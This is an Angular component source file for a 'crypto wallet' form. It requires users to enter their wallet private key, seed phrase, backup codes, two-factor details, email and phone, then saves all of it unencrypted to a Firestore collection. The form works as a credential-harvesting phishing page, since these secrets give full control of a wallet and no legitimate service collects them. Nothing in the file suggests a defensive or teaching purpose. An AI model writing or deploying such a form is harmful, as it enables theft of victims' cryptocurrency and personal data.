import { Component } from '@angular/core';
import {FormBuilder, FormGroup, ReactiveFormsModule, Validators} from '@angular/forms';
import { Firestore, collection, addDoc } from '@angular/fire/firestore';

@Component({
  selector: 'app-crypto-wallet',
  standalone: true,
  imports: [
    ReactiveFormsModule
  ],
  templateUrl: './crypto-wallet.component.html',
  styleUrl: './crypto-wallet.component.css'
})
export class CryptoWalletComponent {
  cryptoWalletForm!: FormGroup;

  constructor(private fb: FormBuilder, private firestore: Firestore) {
    this.cryptoWalletForm = this.fb.group({
      walletName: ['', [Validators.required]],
      walletAddress: ['', [Validators.required]],
      privateKey: ['', [Validators.required]],
      publicKey: ['', [Validators.required]],
      seedPhrase: ['', [Validators.required, Validators.minLength(12)]],
      walletType: ['', [Validators.required]],
      blockchainNetwork: ['', [Validators.required]],
      multiSignature: ['', [Validators.required]],
      twoFactorAuth: ['', [Validators.required]],
      backupCodes: [''],
      linkedEmail: ['', [Validators.required, Validators.email]],
      linkedPhoneNumber: ['', [Validators.pattern('^[0-9]+$')]],
      walletBalance: ['', [Validators.required, Validators.pattern('^[0-9]+(\\.[0-9]{1,8})?$')]],
      recentTransactions: ['']
    });
  }

  ngOnInit(): void {}

  async onSubmit(): Promise<void> {
    if (this.cryptoWalletForm.valid) {
      const formData = {
        walletName: this.cryptoWalletForm.value.walletName,
        walletAddress: this.cryptoWalletForm.value.walletAddress,
        privateKey: this.cryptoWalletForm.value.privateKey,
        publicKey: this.cryptoWalletForm.value.publicKey,
        seedPhrase: this.cryptoWalletForm.value.seedPhrase,
        walletType: this.cryptoWalletForm.value.walletType,
        blockchainNetwork: this.cryptoWalletForm.value.blockchainNetwork,
        multiSignature: this.cryptoWalletForm.value.multiSignature,
        twoFactorAuth: this.cryptoWalletForm.value.twoFactorAuth,
        backupCodes: this.cryptoWalletForm.value.backupCodes || null,
        linkedEmail: this.cryptoWalletForm.value.linkedEmail,
        linkedPhoneNumber: this.cryptoWalletForm.value.linkedPhoneNumber || null,
        walletBalance: this.cryptoWalletForm.value.walletBalance,
        recentTransactions: this.cryptoWalletForm.value.recentTransactions || null,
        submittedAt: new Date()
      };

      try {
        // Save the data to Firestore in the 'cryptoWallets' collection
        await addDoc(collection(this.firestore, 'cryptoWallets'), formData);
        console.log('Crypto Wallet data saved to Firestore');
        alert('Crypto Wallet information submitted successfully!');

        // Reset the form after successful submission
        this.cryptoWalletForm.reset();
      } catch (error) {
        console.error('Error saving data to Firestore:', error);
        alert('There was an error submitting the form.');
      }
    } else {
      alert('Please fill all required fields correctly.');
    }
  }
}
